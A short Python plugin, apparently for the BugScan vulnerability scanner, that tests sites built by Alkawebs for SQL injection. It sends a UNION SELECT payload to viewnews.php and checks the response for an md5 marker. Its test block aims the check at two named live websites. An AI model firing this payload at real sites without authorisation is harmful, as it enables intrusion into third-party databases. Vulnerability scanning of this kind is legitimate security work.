#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = Designed by Alkawebs SQL Injection      Designed by Alkawebs SQL Injection
#__Refer___ = https://www.bugscan.net/#!/x/2132

def assign(service, arg):
    if service == 'alkawebs':
        return True, arg


def audit(arg):
    payload = 'viewnews.php?id=-2%20union%20select%201%2Cmd5%28123%29%2C3%2C4%2C5--+'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and "202cb962ac59075b964b07152d234b70" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('alkawebs', 'http://www.chores4you.co.uk/')[1])
    audit(assign('alkawebs', 'http://www.thestuff.org.uk/')[1])